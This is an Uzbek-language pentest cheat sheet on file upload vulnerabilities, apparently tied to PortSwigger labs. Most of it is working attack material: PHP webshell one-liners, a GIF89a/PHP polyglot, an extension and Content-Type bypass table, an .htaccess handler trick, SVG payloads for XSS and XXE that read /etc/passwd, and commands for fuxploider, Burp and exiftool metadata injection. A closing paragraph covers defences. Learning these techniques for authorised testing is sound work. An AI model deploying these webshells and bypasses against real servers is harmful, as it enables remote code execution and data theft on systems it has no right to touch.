# File Upload Vulnerabilities

> Lab yechimlari (PortSwigger'ning 7 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Ilova fayl yuklashga ruxsat beradi (avatar, hujjat). Agar u faylning **turi/kengaytmasi/mazmunini**
yetarlicha tekshirmasa yoki yuklangan faylni **bajariladigan papkada** saqlasa — sen server-side
kod (`.php` webshell), yoki XSS beradigan fayl (SVG/HTML), yoki XXE beradigan fayl yuklaysan.
Webshell'ni keyin URL orqali chaqirib, serverda buyruq ishlatasan = RCE.

**Ildiz sabab:** ishonch faqat client-side tekshiruvga yoki bitta zaif tekshiruvga (Content-Type,
yoki faqat kengaytma) qo'yilgan, va upload papkasida kod bajarilishi o'chirilmagan. Yagona tekshiruv
har doim aylanib o'tiladi.

## Turlari (bypass bo'yicha)
- **Himoyasiz** — to'g'ridan `.php` yuklanadi → RCE.
- **Content-Type bypass** — `Content-Type: image/jpeg` soxtalashtirish.
- **Extension blacklist bypass** — `.phtml`, `.php5`, yoki `.htaccess` bilan custom kengaytmani PHP'ga map.
- **Obfuscated extension** — null byte (`shell.php%00.jpg`), ikki kengaytma, case.
- **Path traversal in filename** — `..%2fshell.php` bilan bajariladigan papkaga chiqish.
- **Polyglot** — JPG+PHP (exiftool) → image tekshiruvidan o'tadi, lekin PHP ham bajariladi.
- **Race condition** — fayl validatsiyadan oldin saqlanadi, o'sha oynada chaqirasan.

## Oqibatlar (IMPACT)
- **Webshell → RCE** — serverda buyruq (Critical).
- Stored XSS (SVG/HTML), XXE/SSRF (SVG/XML).
- Path traversal (fayl nomi bilan boshqa joyga yozish/overwrite).
> RCE chiqsa **Critical**.

## Qayerdan qidiriladi
Avatar, hujjat, rasm, import, attachment, CV, logo.

## Webshell → RCE
```php
<?php system($_GET['cmd']); ?>          // shell.php
<?=`$_GET[0]`?>                          // qisqa variant
```
> Yuklab, keyin `https://target.com/uploads/shell.php?cmd=id` ni ochasan.

## Bypass jadvali
| Himoya | Bypass |
|--------|--------|
| `.php` bloklanadi | `.php3 .php5 .phtml .pht .phar .inc` |
| ASP | `.asp .aspx .cer .asa` |
| Case filtr | `.pHp .PHP` |
| Double ext | `shell.php.jpg`, `shell.jpg.php` |
| Trailing | `shell.php.`, `shell.php%00.jpg`, `shell.php ` |
| Content-Type | qo'lda `Content-Type: image/jpeg` qo'y |
| Magic byte | fayl boshiga `GIF89a;` qo'sh |
| `.htaccess` | `AddType application/x-httpd-php .jpg` |

```
# Magic byte + PHP polyglot
GIF89a;
<?php system($_GET['c']); ?>
```

## SVG orqali
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>   <!-- XSS -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>  <!-- XXE -->
```

## TOOLLAR

### fuxploider — upload bypass avtomat
```bash
python3 fuxploider.py -u https://target.com/upload
```
> Qaysi kengaytma/Content-Type/magic byte o'tishini avtomat sinab, bypass yo'lini topadi.

### Burp "Upload Scanner" extension
```
Burp → Upload Scanner → upload so'rovini tanla → avtomat payload variantlari
```
> Webshell, SVG XSS, XXE, polyglot variantlarini bir yo'la sinab chiqadi.

### Burp Intruder — kengaytma brute
```
Intruder → filename maydonidagi kengaytmani payload qil → php3/phtml/phar wordlist
```
> Qaysi kengaytma filtrdan o'tib, bajarilishini (RCE) topadi.

### exiftool — payloadni metadata'ga yashirish
```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg
```
> Magic byte tekshiruvini aldab, PHP kodni rasm metadatasiga joylaysan (keyin `.php` sifatida include).

## PoC
RCE → `id`/`hostname`. XSS → SVG'da `alert(document.domain)`.

## Himoya
Extension allowlist + MIME + magic byte + qayta encode (rasmni qayta chizish), random
fayl nomi + web root tashqarida, upload katalogida skript bajarilishini o'chirish,
SVG'ni sanitize, hajm/son limiti.
